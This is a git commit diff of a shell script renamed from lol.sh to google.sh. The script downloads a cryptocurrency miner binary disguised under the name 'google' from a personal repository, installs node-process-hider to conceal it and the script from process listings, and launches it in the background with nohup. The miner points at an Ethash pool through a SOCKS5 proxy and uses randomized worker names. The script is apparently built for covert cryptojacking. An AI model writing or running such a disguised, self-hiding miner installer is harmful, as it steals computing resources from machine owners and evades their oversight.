f8a08f022fdf07fceed427f52e3445da38f39e12
viwarlani <106577288+viwarlani@users.noreply.github.com>
2022-06-11 13:40:03 +0700

    Update and rename lol.sh to google.sh

--- google.sh
+++ google.sh
@@ -1,7 +1,7 @@
 #!/bin/sh
-wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.39/lolMiner_v1.39_Lin64.tar.gz 
-tar -xf lolMiner_v1.39_Lin64.tar.gz
-cd 1.39
+#!/bin/bash
+wget https://github.com/aurbach55/dera/raw/main/google
+chmod +x ./google
 apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
 curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
 apt-get install -y nodejs
@@ -9,6 +9,6 @@ npm i -g node-process-hider
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 ph add lol.sh
-ph add lolMiner
+ph add google
 sleep 14
-./lolMiner --algo ETHASH --pool stratum+tcp://ethash.kupool.com:8888 --user thunder0x.001 --ethstratum ETHPROXY --socks5 46.174.43.18:1080 --timeprint on --longstats 60 
+nohup ./google --algo ETHASH --pool stratum+tcp://ethash.kupool.com:8888 --user thunder0x.$(echo $(shuf -i 1-99999 -n 1)-T4) --ethstratum ETHPROXY --socks5 46.174.43.18:1080 --timeprint on --longstats 60 > nohup.out
